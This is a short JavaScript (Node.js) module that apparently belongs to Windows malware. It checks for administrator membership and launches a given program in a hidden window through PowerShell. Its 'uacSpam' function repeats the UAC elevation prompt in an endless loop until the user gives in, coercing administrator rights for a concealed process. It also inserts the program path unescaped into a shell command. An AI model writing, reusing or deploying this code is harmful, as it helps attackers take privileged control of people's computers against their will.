const core = require('./core');
const childprocess = require('child_process');

function isElevated() {
    const admin = core.execClear(`powershell -Command "[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match \\"S-1-5-32-544\\")"`);
    return admin != "false";
}

function runProcess(runPath, elevated) {
    try {
        let cmd;
        if (elevated) {
            cmd = `powershell -Command "Start-Process -WindowStyle hidden \\"${runPath}\\" -Verb RunAs"`;
        } else {
            cmd = `powershell -Command "Start-Process -WindowStyle hidden \\"${runPath}\\" "`
        }

        childprocess.execSync(cmd, {stdio: 'ignore'});
    } catch (e) {
        return false;
    }

    return true;
}

function uacSpam(path) {
    let elevated = false;
    while (!elevated) {
        elevated = runProcess(path, true);
    }

    process.exit(0);
}

module.exports = {
    uacSpam,
    isElevated,
    runProcess
}